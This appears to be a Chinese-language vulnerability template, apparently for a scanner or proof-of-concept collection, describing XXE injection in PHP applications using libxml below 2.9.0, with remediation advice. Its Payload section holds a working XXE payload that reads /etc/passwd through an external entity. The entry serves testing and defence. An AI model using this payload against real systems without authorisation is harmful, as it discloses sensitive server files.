---
id: PHP-XXE
title: PHP XML 外部实体注入漏洞（XXE）
product: php
vendor: PHP
version_affected: "使用libxml<2.9.0的版本"
severity: MEDIUM
tags: [xxe, 无需认证]
fingerprint: ["PHP"]
---

## 漏洞描述

PHP XML 外部实体注入（XXE）漏洞发生在应用程序解析 XML 输入时。当 XML 解析器配置不当时，处理包含外部实体引用的 XML 输入可能导致敏感信息泄露、SSRF 等问题。

在 libxml 2.9.0 版本之后，默认禁用了外部实体解析。

## 影响版本

- PHP 使用 libxml < 2.9.0

## 前置条件

- 无需认证
- 目标 PHP 应用解析 XML 输入且 libxml 版本较旧

## 利用步骤

1. 发送包含外部实体引用的 XML payload

## Payload

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<n>&xxe;</n>
</root>
```

## 验证方法

```bash
# 检查响应中是否包含文件内容
```

## 修复建议

1. 升级 libxml 至 2.9.0+
2. 禁用 XML 外部实体
3. 对用户输入进行严格过滤
